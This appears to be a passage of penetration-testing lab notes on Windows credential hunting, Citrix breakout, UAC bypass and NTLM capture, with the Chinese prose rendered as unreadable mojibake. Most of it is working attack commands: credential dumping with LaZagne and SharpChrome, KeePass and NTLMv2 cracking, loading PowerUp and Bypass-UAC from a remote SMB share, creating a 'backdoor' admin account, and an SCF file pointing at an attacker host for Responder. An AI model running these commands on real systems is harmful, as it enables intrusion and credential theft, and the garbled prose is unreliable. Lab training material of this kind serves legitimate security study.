Áî®Êà∂Â∞áÂØÜÁ¢º„ÄÅÈáëÈë∞„ÄÅÂâØÊ™îÂêçÊïèÊÑüÊ™îÊ°àÔºàÂ¶Ç .kdbx, .vmdk, .ppk, .rdp, password.txt Á≠âÔºâÈö®ÊÑè‰øùÂ≠òÂú®Êú¨Âú∞ÊàñÂÖ±Áî®Á£ÅÁ¢ü„ÄÇ

Â§öÊï∏‰ºÅÊ•≠Ë®≠ÁΩÆ FILE01\users ÂÖ±Áî®Ë≥áÊñôÂ§æÔºåÊØèÂÄã‰ΩøÁî®ËÄÖÁöÑË≥áÊñôÂ§æÁöÜÁÇ∫„ÄåÂèØË¢´ÂÖ®ÂüüËÆÄÂèñ„Äç„ÄÇ

ÈÄô‰∫õÊ™îÊ°à‰∏ÄÊó¶Ë¢´ÊâæÂà∞ÔºåÂ∞±ËÉΩÂø´ÈÄüÈÄ≤Ë°åÊ©´ÂêëÁßªÂãïÊàñÊ¨äÈôêÊèêÂçá„ÄÇ

üå≥ ÊµÅÁ®ãÊ®πÁãÄÂúñÔºàÊñáÂ≠óÁâàÔºâÔºö

```
Êú¨Âú∞ËàáÁ∂≤Ë∑ØÂÖ±Áî®Á£ÅÁ¢üÊÜëË≠âÁã©Áçµ
‚îú‚îÄ Êú¨Âú∞Á£ÅÁ¢üÊêúÂ∞ã
‚îÇ   ‚îú‚îÄ ‰ΩøÁî® findstr ÊêúÂ∞ãÊïèÊÑüÂ≠ó‰∏≤
‚îÇ   ‚îú‚îÄ ‰ΩøÁî® PowerShell select-string ÈÅûËø¥ÊêúÂ∞ã
‚îÇ   ‚îú‚îÄ Sticky Notes plum.sqlite Ëß£Êûê
‚îÇ   ‚îî‚îÄ Ê™¢Êü•ÁÑ°‰∫∫ÂÄºÂÆàÂÆâË£ùÊ™î unattend.xml
‚îÇ
‚îú‚îÄ Á∂≤Ë∑ØÂÖ±Áî®Á£ÅÁ¢üÊ™¢Á¥¢
‚îÇ   ‚îú‚îÄ net use Ê™¢Êü•ÁèæÊúâÊéõËºâÁ£ÅÁ¢ü
‚îÇ   ‚îú‚îÄ ‰ΩøÁî® snaffler Ëá™ÂãïÂåñÁçµÂèñÊïèÊÑüÊ™î
‚îÇ   ‚îî‚îÄ ÊâãÂãïÂ∞ãÊâæÁâπÂÆöÂâØÊ™îÂêçÔºà.kdbx„ÄÅ.ppk„ÄÅ.rdp„ÄÅ.credÔºâ
‚îÇ
‚îî‚îÄ Âà©Áî®ÂèñÂæóÊÜëË≠âË°åÂãï
    ‚îú‚îÄ RDP„ÄÅWinRM Ê∏¨Ë©¶ÁôªÂÖ•
    ‚îú‚îÄ Âà©Áî® PsExec Âü∑Ë°åÊ©´ÂêëÁßªÂãï
    ‚îî‚îÄ Â∞áÂ∏≥ËôüÈóú‰øÇÂúñÈÄÅÂÖ• BloodHound ÂàÜÊûêË∑ØÂæë
```

üõ† ÊâãÂãïÊêúÂ∞ãÊåá‰ª§ËàáÁØÑ‰æãÔºö

1Ô∏è‚É£ ÊâãÂãïÊêúÂ∞ãÊ™îÊ°àÂÖßÂÆπÔºàÊâæ„Äåpassword„ÄçÂ≠ó‰∏≤Ôºâ

```
findstr /SI /M "password" *.txt *.ini *.cfg *.config *.xml
select-string -Path C:\Users\*\Documents\*.txt -Pattern password
```

2Ô∏è‚É£ ÊêúÂ∞ãÁâπÂÆöÂâØÊ™îÂêç

```
dir /S /B *pass*.txt *cred* *.vnc *.config
where /R C:\ *.config
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.kdbx, *.ppk -ErrorAction Ignore
```

3Ô∏è‚É£ Sticky Notes Ë≥áÊñôÂ∫´ÂàÜÊûê

* Ë∑ØÂæëÔºöC:\Users\\\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes\_8wekyb3d8bbwe\LocalState\plum.sqlite
* ÂèØÁî® DB Browser for SQLite Êàñ PowerShell PSSQLite Ê®°ÁµÑÊü•Ë©¢„ÄÇ

4Ô∏è‚É£ Á∂≤Ë∑ØÂÖ±Áî®Á£ÅÁ¢üÁçµÂèñ

* Ê™¢Êü•ÊéõËºâÁ£ÅÁ¢üÔºö

```
net use
```

* ‰ΩøÁî® Snaffler Ëá™ÂãïÂåñÊêúÂ∞ãÔºö

```
Snaffler.exe --output-dir "C:\loot" --threads 10
```

5Ô∏è‚É£ Â∏∏Ë¶ã„ÄåÂÖ∂‰ªñ„ÄçÊïèÊÑüÊ™îÊ°àÊ∏ÖÂñÆÔºàÈúÄÊ™¢Êü•Ôºâ

* %SYSTEMDRIVE%\pagefile.sys
* %WINDIR%\debug\NetSetup.log
* %WINDIR%\system32\config\security.sav
* %USERPROFILE%\ntuser.dat
* C:\ProgramData\Configs\\\*

üí° Â¶ÇÊûúÁôºÁèæÊ¨äÈôê‰∏çË∂≥

* ÂòóË©¶ÂèñÂæóÁ≥ªÁµ±ÁÆ°ÁêÜÂì°Êàñ SYSTEM Ê¨äÈôê
* ‰ΩøÁî® PsExec ÊèêÂçáÊ¨äÈôêÔºö

```
psexec -i -s cmd.exe
```

* Ê™¢Êü•ÁõÆÈåÑÊ¨äÈôê‰ΩøÁî®Ôºö

```
AccessChk.exe -d <target_folder
```

</details>

<details>

<summary>ÈÄ≤‰∏ÄÊ≠•ÁöÑÊÜëË≠âÁõúÁ´äÔºàFurther Credential TheftÔºâ</summary>



üå≥ ÊµÅÁ®ãÊ®πÁãÄÂúñÔºö

```
ÈÄ≤‰∏ÄÊ≠•ÊÜëË≠âÁã©Áçµ
‚îú‚îÄ Cmdkey ÂÑ≤Â≠òÊÜëË≠â
‚îú‚îÄ ÁÄèË¶ΩÂô®ÊÜëË≠âÔºàSharpChromeÔºâ
‚îú‚îÄ ÂØÜÁ¢ºÁÆ°ÁêÜÂô®ÔºàKeePass ÂìàÂ∏åÁ†¥Ëß£Ôºâ
‚îú‚îÄ ÈõªÂ≠êÈÉµ‰ª∂ (MailSniper ÊêúÁ¥¢)
‚îú‚îÄ LaZagne Â§öËªüÈ´îÊÜëË≠âÊèêÂèñ
‚îú‚îÄ SessionGopher ÊêúÁ¥¢ÊúÉË©±ÊÜëË≠â
‚îú‚îÄ Windows AutoLogon ÊÜëË≠â
‚îú‚îÄ PuTTY Ë®ªÂÜäË°®ÊÜëË≠â
‚îî‚îÄ WiFi ÂÑ≤Â≠òÂØÜÁ¢ºÊèêÂèñ
```

ÈÄ≤‰∏ÄÊ≠•ÁöÑÊÜëË≠âÁõúÁ´äÔºàFurther Credential TheftÔºâ

1Ô∏è‚É£ Cmdkey ‰øùÂ≠òÁöÑÊÜëË≠â

* **Ê¶ÇÂøµ**Ôºöcmdkey Êåá‰ª§ÂèØÂàóÂá∫„ÄÅÂª∫Á´ã„ÄÅÂà™Èô§ÂÑ≤Â≠òÁöÑÊÜëË≠âÔºåÈÄöÂ∏∏Áî®Êñº RDP ÊàñÁµÇÁ´ØÊúçÂãô„ÄÇ
* **Êìç‰ΩúÁØÑ‰æã**Ôºö

```
cmdkey /list
```

* **ÊáâÁî®**ÔºöÊâæÂà∞ÂæåÂèØÈÄèÈÅé RDP Êàñ `runas` ÈáçÁî®Ë©≤ÊÜëË≠â„ÄÇ
* **ÈáçÁî®Êåá‰ª§ÁØÑ‰æã**Ôºö

```
runas /savecred /user:domain\\user "powershell.exe"
```

2Ô∏è‚É£ ÁÄèË¶ΩÂô®ÂÑ≤Â≠òÊÜëË≠âÊèêÂèñÔºàChrome ÁØÑ‰æãÔºâ

* **Â∑•ÂÖ∑**ÔºöSharpChrome
* **‰ΩøÁî®ÁØÑ‰æã**Ôºö

```
SharpChrome.exe logins /unprotect
```

* **Ë™™Êòé**ÔºöÂèØÂèñÂæó cookie„ÄÅÂÑ≤Â≠òÁöÑÁôªÂÖ•Ë≥áË®ä„ÄÇË¶ÅÊ≥®ÊÑèÊúÉÁî¢ÁîüÊó•Ë™å‰∫ã‰ª∂Ôºà4983„ÄÅ4688„ÄÅ16385Ôºâ„ÄÇ

3Ô∏è‚É£ ÂØÜÁ¢ºÁÆ°ÁêÜÂô®ÔºàKeePassÔºâÂìàÂ∏åÊèêÂèñËàáÁ†¥Ëß£

* **Ê≠•È©ü**Ôºö
  * ÊâæÂà∞ `.kdbx` Ê™îÊ°à„ÄÇ
  * ‰ΩøÁî® keepass2john ÊèêÂèñÂìàÂ∏åÔºö

```
python2.7 keepass2john.py file.kdbx > hash.txt
```

* ‰ΩøÁî® Hashcat Á†¥Ëß£Ôºö

```
hashcat -m 13400 hash.txt rockyou.txt
```

* **Á†¥Ëß£ÊàêÂäüÂæå**ÔºöÂèØÁç≤Âæó IT ÈÉ®ÈñÄÈ´òÊ¨äÈôêÂ∏≥Ëôü„ÄÇ

4Ô∏è‚É£ MailSniper ÊêúÁ¥¢ÈõªÂ≠êÈÉµ‰ª∂‰∏≠ÁöÑÊÜëË≠â

* **Ê¶ÇÂøµ**ÔºöÂú® Exchange ‰ø°ÁÆ±‰∏≠ÊêúÂ∞ãÂØÜÁ¢ºÁõ∏ÈóúÂ≠óÁúº„ÄÇ
* **ÁØÑ‰æã**Ôºö

```
Invoke-MailSearch -Identity user -SearchQuery 'password OR creds'
```

5Ô∏è‚É£ LaZagne Â∑•ÂÖ∑

* **ÂäüËÉΩ**ÔºöÊîØÊè¥ÂæûÂ§öÁ®ÆËªüÈ´î‰∏≠ÊèêÂèñÊÜëË≠âÔºàÂåÖÊã¨ÁÄèË¶ΩÂô®„ÄÅËÅäÂ§©„ÄÅË≥áÊñôÂ∫´„ÄÅÁ≥ªÁµ±Â∑•ÂÖ∑Á≠âÔºâ„ÄÇ
* **Êåá‰ª§**Ôºö

```
lazagne.exe all
```

6Ô∏è‚É£ SessionGopher ÊêúÁ¥¢ RDP„ÄÅPuTTY„ÄÅWinSCP ÊÜëË≠â

* **‰ΩøÁî®ÁØÑ‰æã**Ôºö

```
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target localhost
```

7Ô∏è‚É£ ÁôªÈåÑÊ™îËá™ÂãïÁôªÂÖ•ÊÜëË≠âÔºàWindows AutoLogonÔºâ

* **Êü•Ë©¢Ë∑ØÂæë**Ôºö

```
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
```

* **ÈáçÈªûÈ†ÖÁõÆ**Ôºö`DefaultUserName`„ÄÅ`DefaultPassword`

8Ô∏è‚É£ PuTTY Ë®ªÂÜäË°®ÊÜëË≠âÊèêÂèñ

* **Êü•Ë©¢Êåá‰ª§**Ôºö

```
reg query HKCU\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions
```

9Ô∏è‚É£ WiFi ÂØÜÁ¢ºÊèêÂèñ

* **ÂàóÂá∫ÂÑ≤Â≠òÁöÑ WiFi**Ôºö

```
netsh wlan show profile
```

* **ÂèñÂæóÂØÜÁ¢º**Ôºö

```
netsh wlan show profile <SSID> key=clear
```

</details>

<details>

<summary>ÂèóÈôêÁí∞Â¢ÉÊ¨äÈôêÁ™ÅÁ†¥</summary>



1Ô∏è‚É£ Interacting with Users ËàáÁî®Êà∂‰∫íÂãï

üè¢ **ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµÔºö** Âú®Â§ßÂûã‰ºÅÊ•≠ÊàñÂèóÊéßÁí∞Â¢É‰∏≠Ôºà‰æãÂ¶Ç Citrix„ÄÅAWS AppStream„ÄÅCyberArk PSMÔºâÔºåÁÆ°ÁêÜÂì°ÊúÉÂØ¶ÊñΩÂ§öÂ±§Á¥öÈéñÂÆöÁ≠ñÁï•‰ª•Èò≤ÁØÑÊÉ°ÊÑèË°åÁÇ∫„ÄÇÁÑ∂ËÄåÔºåÊîªÊìäËÄÖ‰ªçÂèØÈÄèÈÅéÂà©Áî®‰∫∫ÊÄßÂº±Èªû„ÄÅË¶ñË¶∫Ë™òÈ®ôÔºàÂ¶Ç‰øÆÊîπÊç∑ÂæëÔºâ„ÄÅ‰ª•ÂèäÈñìÊé•Ëß∏ÁôºÔºà‰æãÂ¶ÇÊñá‰ª∂ÂúñÁ§∫ÊäìÂèñÔºâÁ≠âÊâãÊ≥ïÈÄ≤Ë°åÁ™ÅÁ†¥ËàáÊèêÊ¨ä„ÄÇ

üå≥ **ÊîªÊìäÊµÅÁ®ãÊ®πÁãÄÂúñÔºö**

```
Citrix Breakout ÊîªÊìäÊµÅÁ®ã
‚îú‚îÄ 1. Áç≤Âèñ Dialog Box (MS Paint / Notepad / WordPad)
‚îÇ   ‚îî‚îÄ ÊâãÂãïÈñãÂïü > File > Open > Âà©Áî® UNC Ë∑ØÂæëË∑≥ËΩâ
‚îú‚îÄ 2. Âü∑Ë°å SMB ÂÖ±‰∫´Êª≤ÈÄè
‚îÇ   ‚îú‚îÄ ÊîªÊìäÁ´ØÂïüÂãï smbserver.py
‚îÇ   ‚îî‚îÄ UNC Ëº∏ÂÖ•ÊîªÊìäËÄÖ shareÔºåÂè≥ÈçµÂü∑Ë°å payloadÔºàpwn.exe ÈñãÂïü cmdÔºâ
‚îú‚îÄ 3. Êõø‰ª£ Explorer++
‚îÇ   ‚îî‚îÄ Âà©Áî®ÂèØÊîúÁâàÁÄèË¶ΩÂô®ÁπûÈÅéË∑ØÂæëÈôêÂà∂ÔºåÂ∞áÂ∑•ÂÖ∑ÊãâÂà∞Ê°åÈù¢
‚îú‚îÄ 4. ‰øÆÊîπÊç∑Âæë (.lnk) Ê™îÊ°àÁõÆÊ®ô
‚îÇ   ‚îî‚îÄ ÊåáÂêë cmd.exe / Ëá™Ë®Ç payload
‚îú‚îÄ 5. ËÖ≥Êú¨Âü∑Ë°åÔºà.bat/.vbs/.psÔºâ
‚îÇ   ‚îî‚îÄ Ëá™Âª∫ evil.bat ÔºàÂÖßÂÆπÔºöcmdÔºâ‰∏¶Âü∑Ë°åÂèñÂæó shell
‚îî‚îÄ 6. Ê¨äÈôêÊèêÂçá
    ‚îú‚îÄ ‰ΩøÁî® PowerUp.ps1 ÊéÉÊèè AlwaysInstallElevated
    ‚îú‚îÄ Áî¢Áîü UserAdd.msi Âª∫Á´ãÁÆ°ÁêÜÂì°Â∏≥Êà∂
    ‚îú‚îÄ runas ÂïüÂãï backdoor ‰ΩøÁî®ËÄÖ
    ‚îî‚îÄ ‰ΩøÁî® Bypass-UAC ËÖ≥Êú¨ÂèñÂæóÊúÄÈ´òÊ¨äÈôê
```

üîé **Ë©≥Á¥∞Ê≠•È©üÔºãÁØÑ‰æã‰ª£Á¢ºÔºãËÉåÂæåÂéüÁêÜ**



**1Ô∏è‚É£ ‰ΩøÁî® Dialog Box ÂèñÂæóË∑ØÂæëÁ™ÅÁ†¥**

* Â∑•ÂÖ∑ÔºöMS Paint
* Ê≠•È©üÔºöFile > Open > Ëº∏ÂÖ• `\\127.0.0.1\c$\Users\pmorgan`
* ÂéüÁêÜÔºöUNC Ë∑ØÂæë‰∏çÂèóÁæ§ÁµÑÁ≠ñÁï•ÈôêÂà∂ÔºåÂèØÁπûÈÅéÈéñÂÆö
* DebugÔºöËã•ÊèêÁ§∫Ê¨äÈôê‰∏çË∂≥ÔºåÂòóË©¶‰∏çÂêåÂ∑•ÂÖ∑ÔºàNotepad„ÄÅWordpadÔºâÊàñÁ¢∫Ë™ç SMB Á´ØÂè£ÈñãÊîæ

ÈÄ£Á∑öÂæåÔºåÂ≠∏ÁîüÂ∞áÈÄ≤ÂÖ•ÂèóÈôêÁöÑ Windows 7 Áí∞Â¢É„ÄÇÊé•‰∏ã‰æÜÔºåÂ≠∏ÁîüÈúÄË¶ÅÂü∑Ë°å `Paint` ÔºåÂà©Áî® `Open` Â∞çË©±Ê°ÜÂ≠òÂèñ `pmorgan` ‰ΩøÁî®ËÄÖÁõÆÈåÑÔºö

![](<../.gitbook/assets/Ëû¢ÂπïÊà™Âúñ 2025-03-25 17.35.26.png>)\




\
![](<../.gitbook/assets/Ëû¢ÂπïÊà™Âúñ 2025-03-25 17.36.36.png>)

ÈÅ∏Êìá `All Files` ÔºåÂ≠∏ÁîüÈúÄË¶ÅËº∏ÂÖ• UNC Ë∑ØÂæë `\\127.0.0.1\c$\users\pmorgan` ‰ΩúÁÇ∫Êñá‰ª∂ÂêçÔºåÁÑ∂ÂæåÊåâ‰∏Ä‰∏ã `Open` Ôºö

![](<../.gitbook/assets/Ëû¢ÂπïÊà™Âúñ 2025-03-25 17.37.16.png>)

**2Ô∏è‚É£ SMB ÂàÜ‰∫´Âü∑Ë°å Payload**

* ÊîªÊìäÁ´ØÔºö (WINDOWS)&#x20;

```bash
cd Tools/
sudo su
smbserver.py -smb2support share $(pwd)
```

* Citrix Á´ØÂú® dialog box Ëº∏ÂÖ• `\\<AttackerIP>\share` > Âè≥ÈçµÂü∑Ë°å pwn.exe
*   Âõ†Ê≠§ÔºåÂ≠∏ÁîüÈúÄË¶ÅÂè≥ÈçµÈªûÊìäÈñãÂïü `pwn.exe` ÔºåÂæûÂèóÈôêÁí∞Â¢ÉÂÖßÂïüÂãïÂëΩ‰ª§ÊèêÁ§∫Â≠óÂÖÉÔºö

    \
    ![](<../.gitbook/assets/Ëû¢ÂπïÊà™Âúñ 2025-03-25 17.40.52.png>)
* pwn.exe ÁØÑ‰æãÔºö

```c
#include <stdlib.h>
int main() { system("C:\\Windows\\System32\\cmd.exe"); }
```

* DebugÔºöËã•ÁÑ°Ê≥ïÂü∑Ë°åÔºåÁ¢∫Ë™ç SMB ÊòØÂê¶ÂÖÅË®± UNC Âü∑Ë°å

**3Ô∏è‚É£**&#x20;

*   ÁèæÂú®ÔºåÂ≠∏ÁîüÈúÄË¶ÅÂçáÁ¥öÂà∞ `powershell` ÊúÉË©±ÔºåÂêåÊôÇÂ∞éËà™Âà∞ `C:\users\public` Ôºå‰ª•‰æø‰ªñÂÄëÂèØ‰ª•Ë§áË£Ω `PowerUp.ps1` Âíå `Bypass-UAC.ps1` ËÖ≥Êú¨ÔºöÈö®ÂæåÔºåÂ≠∏ÁîüÈúÄË¶Å‰ΩøÁî® `Write-UserAddMSI` cmdlet ‰æÜ‰øÉÈÄ≤ `.msi` Ê™îÊ°àÁöÑÂª∫Á´ãÔºö

    ```cmd
    powershell -ep bypass
    cd c:\users\public
    xcopy \\10.13.38.95\share\PowerUp.ps1 .
    xcopy \\10.13.38.95\share\Bypass-UAC.ps1 .
    Import-Module .\PowerUp.ps1
    Write-UserAddMSI
    ```

    \
    Â≠∏ÁîüÈúÄË¶ÅÂü∑Ë°å `UserAdd.msi` Ôºå‰ΩøÁî®ÊÜëË≠â `backdoor:T3st@123` Âª∫Á´ã‰∏ÄÂÄãÊñ∞Áî®Êà∂
*

    <figure><img src="../.gitbook/assets/Ëû¢ÂπïÊà™Âúñ 2025-03-25 17.42.24.png" alt=""><figcaption></figcaption></figure>

    ```cmd-session
    .\userAdd.msi
    ```

ÁèæÂú®ÔºåÂ≠∏ÁîüÈúÄË¶Å‰ΩøÁî® `runas` ‰ª•Âæå `backdoor` ‰ΩøÁî®ËÄÖË∫´ÂàÜÂïüÂãïÂëΩ‰ª§ÊèêÁ§∫Â≠óÂÖÉÔºö![](<../.gitbook/assets/Ëû¢ÂπïÊà™Âúñ 2025-03-25 17.43.11.png>)

```cmd
runas /user:backdoor cmd
```

ÊúÄÂæåÔºåÂæûÊñ∞Âª∫Á´ãÁöÑÂëΩ‰ª§ÊèêÁ§∫Â≠óÂÖÉ‰∏≠ÔºåÂ≠∏ÁîüÈúÄË¶Å‰ΩøÁî® `Bypass-UAC.ps1` ÁπûÈÅé UACÔºö

```cmd
powershell -ep bypass
cd C:\users\public
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -method UacMethodSysprep
```

\
\
![](<../.gitbook/assets/Ëû¢ÂπïÊà™Âúñ 2025-03-25 17.43.50.png>)

‚úÖ **Á∏ΩÁµê & ‰∏ã‰∏ÄÊ≠•**

* Â∑≤ÂÆåÊàêÁ™ÅÁ†¥ÂèóÈôê Citrix Áí∞Â¢É„ÄÅÂèñÂæóÁ≥ªÁµ± Shell„ÄÅÂÆåÊàêÊú¨Âú∞ÊèêÊ¨ä„ÄÇ üëâ ‰∏ã‰∏ÄÊ≠•Âª∫Ë≠∞Ôºö
* ‰ΩøÁî® `whoami /all` Á¢∫Ë™çÊ¨äÈôêÁ≠âÁ¥ö
* Â∞áÊÜëË≠âÊàñ shell ‰∏äÂ†± Team Server (Â¶Ç Cobalt Strike)
* ÈÄ≤Ë°å AD Domain Ê©´ÂêëÊª≤ÈÄèÊàñ Kerberos ÊîªÊìä
* ÊúÄÂæåÂÅöÂ•ΩÊ∏ÖÁêÜ‰∏¶ÁßªÈô§ÂæåÈñÄÔºåÈÅøÂÖçÁóïË∑°

üõ† **Â¶Ç Debug Âá∫ÈåØÔºö**

| ÂïèÈ°å              | Ê™¢Êü•ÊñπÊ≥ï                                      |
| --------------- | ----------------------------------------- |
| ÁÑ°Ê≥ïÈñãÂïü dialog box | ÂòóË©¶ Notepad„ÄÅWordPad ÊàñÂÖ∂‰ªñÂÖßÂª∫ App              |
| ÁÑ°Ê≥ïÈÄèÈÅé UNC Ë∑≥ËΩâ     | Á¢∫Ë™ç SMB Server ÈñãÂïü„ÄÅÁ´ØÂè£ÂÖÅË®±                     |
| payload ÁÑ°Ê≥ïÂü∑Ë°å    | Á¢∫‰øù pwn.exe Â∑≤Âú® SMB ‰∏îÁÑ° AV ÊîîÊà™                |
| UAC Bypass Â§±Êïó   | ÊèõÂè¶‰∏ÄÁπûÈÅéÊâãÊ≥ï (Event Viewer, fodhelper) ‰∏¶ÂçáÁ¥öËÖ≥Êú¨ÁâàÊú¨ |

</details>

<details>

<summary>ÊîªÊìäÂ∑≤Áü•ÁöÑÈúÄË¶ÅÁî®Êà∂‰∫íÂãïÁöÑÊòìÂèóÊîªÊìäÁöÑÊúçÂãô</summary>



1Ô∏è‚É£ Interacting with Users ËàáÁî®Êà∂‰∫íÂãï

üè¢ **ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµÔºö** Âú®‰ºÅÊ•≠Áí∞Â¢É‰∏≠Ôºå‰ΩøÁî®ËÄÖÁ∂ìÂ∏∏ÊòØÂÆâÂÖ®Èèà‰∏≠ÊúÄËñÑÂº±ÁöÑ‰∏ÄÁí∞„ÄÇÈ´òÂ£ìÂ∑•‰Ωú‰∏ãÂÆπÊòìÂøΩÁï•Áï∞Â∏∏Ë°åÁÇ∫ÔºåÊîªÊìäËÄÖÊúÉÂà©Áî®ÈÄôÈªûÈÄèÈÅéÈá£È≠öÈÉµ‰ª∂„ÄÅÊÉ°ÊÑèÂÖ±‰∫´„ÄÅÊªëÈº†ÊªëÈÅéÁöÑÊç∑ÂæëÊ™îÁ≠âÊäÄÂ∑ßÔºåÂæû‰∏çÁ∂ìÊÑèÁöÑÁî®Êà∂‰∫íÂãï‰∏≠Á´äÂèñÊÜëË≠âÊàñËß∏ÁôºÊÉ°ÊÑèË°åÁÇ∫„ÄÇ

üå≥ **ÊîªÊìäÊµÅÁ®ãÊ®πÁãÄÂúñÔºö**

```
ËàáÁî®Êà∂‰∫íÂãïÂèñÂæóÊÜëË≠âÂÆåÊï¥ÊîªÊìäÊµÅÁ®ã
‚îú‚îÄ 1. ÊµÅÈáèÂóÖÊé¢
‚îÇ   ‚îú‚îÄ Á¢∫Ë™çÁõÆÊ®ôÊ©üÊòØÂê¶ÂÆâË£ù Wireshark ÊàñÈñãÊîæ Npcap
‚îÇ   ‚îú‚îÄ ‰ΩøÁî® tcpdump„ÄÅnet-creds„ÄÅWireshark ÊçïÊçâÊïèÊÑüÂçîÂÆöÊµÅÈáè (FTP, SMB)
‚îÇ   ‚îî‚îÄ ÂàÜÊûê NTLMv2 ÊµÅÈáè‰ª•ÂèñÂæóÂìàÂ∏å
‚îÇ
‚îú‚îÄ 2. Áõ£ÊéßÁ≥ªÁµ±ÂëΩ‰ª§Ë°å (Êú¨Âú∞ÊèêÊ¨ä)
‚îÇ   ‚îú‚îÄ ÈÉ®ÁΩ≤ PowerShell ËÖ≥Êú¨ÊåÅÁ∫åÁõ£ÊéßÈÄ≤Á®ã
‚îÇ   ‚îú‚îÄ ÂÅµÊ∏¨ÂåÖÂê´ÊÜëË≠âÁöÑ net use„ÄÅÂÇô‰ªΩÊåá‰ª§Á≠â
‚îÇ   ‚îî‚îÄ ÊèêÂèñÊòéÊñáÂØÜÁ¢º
‚îÇ
‚îú‚îÄ 3. Âà©Áî®ËÑÜÂº±ÊúçÂãô (CVE)
‚îÇ   ‚îú‚îÄ Docker Desktop CVE-2019-15752
‚îÇ   ‚îî‚îÄ Â∞áÊÉ°ÊÑè exe Ê§çÂÖ• version-binÔºåÁ≠âÂæÖÊúçÂãôÈáçÂïü
‚îÇ
‚îú‚îÄ 4. ÊîæÁΩÆÈá£È≠öÊ™îÊ°à
‚îÇ   ‚îú‚îÄ ÂâµÂª∫ .scf Êñá‰ª∂ÔºåIcon ÊåáÂêëÊîªÊìäËÄÖ SMB
‚îÇ   ‚îú‚îÄ ‰ΩøÁî®ÊÉ°ÊÑè .lnk (ÂèØËá™ÂãïËß∏ÁôºË∫´‰ªΩÈ©óË≠â)
‚îÇ   ‚îî‚îÄ Êê≠ÈÖç Responder / Inveigh ÊäìÂèñÈõúÊπä
‚îÇ
‚îî‚îÄ 5. ÈõúÊπäÁ†¥Ëß£ & ÂæåÁ∫åË°åÂãï
    ‚îú‚îÄ ‰ΩøÁî® hashcat Á†¥Ëß£ NTLMv2
    ‚îú‚îÄ Âà©Áî®ÊòéÊñáÈÄ≤Ë°å RDP/WinRM ÂòóË©¶
    ‚îî‚îÄ ÈÄ≤Ë°å AD Ê©´ÂêëÊª≤ÈÄè
```

üîé **Ë©≥Á¥∞Ê≠•È©üÁØÑ‰æãÔºãËÉåÂæåÂéüÁêÜË™™ÊòéÔºö**

**Ôºà1ÔºâWireshark ÂóÖÊé¢ÊòéÊñáÊÜëË≠â**

* Êåá‰ª§Ôºö

```bash
sudo wireshark Êàñ sudo tcpdump -i eth0
```

* ÂéüÁêÜÔºöÈÉ®ÂàÜËÄÅËàäÊúçÂãôÔºàFTP„ÄÅTelnetÔºâ‰ª•ÊòéÊñáÂÇ≥ÈÅûÂ∏≥ÂØÜÔºåÂèØÁõ¥Êé•ÊîîÊà™
* DebugÔºöËã•Êäì‰∏çÂà∞ÊµÅÈáèÔºåÁ¢∫Ë™çÊòØÂê¶Êúâ npcap Ë®≠ÂÆöÊàñÈò≤ÁÅ´ÁâÜÈòªÊìã

**Ôºà2Ôºâ**&#x65B0;ÁöÑÁµÇÁ´ØÈÅ∏È†ÖÂç°‰∏≠ÂïüÂãï `Responder` ‰∏¶ÈñãÂßãÁõ£ËÅΩ `tun0` ‰ªãÈù¢Ôºö

* Êåá‰ª§ÁØÑ‰æãÔºö

```powershell
sudo apt-get install responder
sudo responder -wrf -v -I tun0
```

* ÂéüÁêÜÔºöÁõ£ËÅΩÁ™ÅÁôºÂëΩ‰ª§Ë°å‰∏≠ÂèØËÉΩÂåÖÂê´Â∏≥ËôüÂØÜÁ¢ºÁöÑ net use ÊàñÂÇô‰ªΩÊåá‰ª§
* DebugÔºöËã•ÁÑ°ÁµêÊûúÔºåÁ¢∫Ë™çÁõÆÊ®ôÊúâÁÑ° PowerShell Ê¨äÈôêËàáÈÅ†Á´ØÈÄ£Á∑öÁ≠ñÁï•

**Ôºà3ÔºâÊîæÁΩÆ SCF Êñá‰ª∂**

* ÂÖßÂÆπÁØÑ‰æãÔºö
* ÈñãÂïü `Notepad`

```ini
[Shell]
Command=2
IconFile=\\<attackerIP>\\share\\legit.ico
[Taskbar]
Command=ToggleDesktop
```

* ÁÑ∂ÂæåÔºåÈúÄË¶ÅÈªûÊìä `File` -> `Save As` Ôºå‰∏¶‰ΩøÁî®Êñá‰ª∂Ë≥áÊ∫êÁÆ°ÁêÜÂô®Â∞éËà™Âà∞ `C:\Department Shares\Public\IT` ‰∏¶Â∞áÊñá‰ª∂ÂÑ≤Â≠òÁÇ∫ `@Inventory.scf` Ôºö
* ÂéüÁêÜÔºöWindows Explorer ËÆÄÂèñ icon ÊôÇËß∏Áôº NTLM Ë™çË≠â
* DebugÔºöËã•ÁÑ°ÂèçÊáâÔºåÊ™¢Êü• SMB ÊòØÂê¶Ê≠£Â∏∏ÊúçÂãôÔºå‰ª•ÂèäË∑ØÂæëÊãºÂØ´

**Ôºà5Ôºâ‰ΩøÁî® Hashcat Á†¥Ëß£ NTLMv2**

* Êåá‰ª§Ôºö

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

* DebugÔºöÂ¶ÇÈÄüÂ∫¶ÈÅéÊÖ¢ÔºåÂèØË™øÊï¥ --force„ÄÅÂä†Â§ß threads

üõ† **Â¶ÇÊûú Debug Âá∫ÈåØÊÄéÈ∫ºËæ¶Ôºü**

* Wireshark Êäì‰∏çÂà∞Â∞ÅÂåÖÔºöÊîπÁî® tcpdump ‰∏¶Á¢∫Ë™çÈè°ÂÉèÂü†ÊòØÂê¶ÈñãÂïü
* Responder ÁÑ°Ê≥ïËß∏ÁôºÔºöÁ¢∫Ë™çË∑ØÂæëÊãºÂØ´„ÄÅÁî®Êà∂ÊòØÂê¶ÁÄèË¶ΩÈÅéË©≤ÁõÆÈåÑ
* PowerShell ËÖ≥Êú¨Â†±ÈåØÔºöÁ¢∫Ë™ç Execution Policy ‰∏¶Âä†‰∏ä `Set-ExecutionPolicy Bypass`„ÄÇ
* Hashcat ÈÄüÂ∫¶Â§™ÊÖ¢ÔºöÂä†ÂÖ• GPUÔºåÊàñ‰ΩøÁî® mask ÊîªÊìä„ÄÇ

